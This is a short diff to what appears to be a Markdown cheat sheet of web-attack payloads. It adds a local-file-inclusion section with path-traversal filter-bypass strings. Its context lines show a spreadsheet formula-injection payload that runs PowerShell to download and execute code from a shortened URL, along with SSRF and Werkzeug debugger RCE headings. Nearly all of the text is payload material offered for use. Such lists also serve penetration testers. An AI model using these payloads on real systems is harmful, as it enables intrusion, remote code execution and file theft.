@@ -114,6 +114,14 @@ http://[::]
 =cmd|'/C powershell IEX(wget bit.ly/1X146m3)'!A0
 ```
 
+## LFI
+
+**Filter Bypass**
+
+```
+"../\", " ..\/", "/.." & "\/.."
+```
+
 ## RCE
 
 **Werkzeug Debugger**
